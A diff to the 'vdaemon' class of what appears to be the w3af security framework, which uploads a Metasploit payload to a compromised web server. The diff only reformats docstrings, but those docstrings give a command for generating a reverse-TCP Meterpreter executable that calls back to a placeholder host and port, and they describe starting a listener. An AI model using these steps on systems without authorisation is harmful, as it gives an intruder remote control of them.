@@ -42,7 +42,7 @@ class vdaemon(object):
     This class should be sub-classed by winVd and lnxVd, each implementing a different way
     of sending the metasploit payload to the remote web server.
 
-    @author: Andres Riancho (andres.riancho@gmail.com)
+    :author: Andres Riancho (andres.riancho@gmail.com)
     '''
     def __init__(self, exec_method):
 
@@ -61,9 +61,9 @@ class vdaemon(object):
         "payload vdaemon linux/x86/meterpreter/reverse_tcp" command in his w3af
         shell after exploiting a vulnerability.
 
-        @param user_defined_parameters: The parameters defined by the user, for
+        :param user_defined_parameters: The parameters defined by the user, for
                                         example, the type of payload to send.
-        @return: True if we succeded.
+        :return: True if we succeded.
         '''
 
         #
@@ -135,7 +135,7 @@ class vdaemon(object):
 
         In a new console.
 
-        @return: True if it was possible to start the listener in a new console
+        :return: True if it was possible to start the listener in a new console
         '''
         msfcli_command = '%s %s %s' % (
             self._msfcli_path, msfcli_handler, ' '.join(parameters))
@@ -158,10 +158,10 @@ class vdaemon(object):
         The method will basically run something like:
         msfpayload linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=8443 X > /tmp/output2.exe
 
-        @param payload: The payload to generate (linux/x86/meterpreter/reverse_tcp)
-        @param parameters: A list with the parameters to send to msfpayload ['LHOST=1.2.3.4', 'LPORT=8443']
+        :param payload: The payload to generate (linux/x86/meterpreter/reverse_tcp)
+        :param parameters: A list with the parameters to send to msfpayload ['LHOST=1.2.3.4', 'LPORT=8443']
 
-        @return: The name of the generated file, in the example above: "/tmp/output2.exe"
+        :return: The name of the generated file, in the example above: "/tmp/output2.exe"
         '''
         temp_dir = tempfile.gettempdir()
         randomness = str(random.randint(0, 293829839))
@@ -192,8 +192,8 @@ class vdaemon(object):
         This method should be implemented according to the remote operating system. The idea here is to
         send the exe_file to the remote server and save it in a file.
 
-        @param exe_file: The local path to the executable file
-        @return: The name of the remote file that was uploaded.
+        :param exe_file: The local path to the executable file
+        :return: The name of the remote file that was uploaded.
         '''
         om.out.debug('Called _send_exe_to_server()')
         om.out.console(
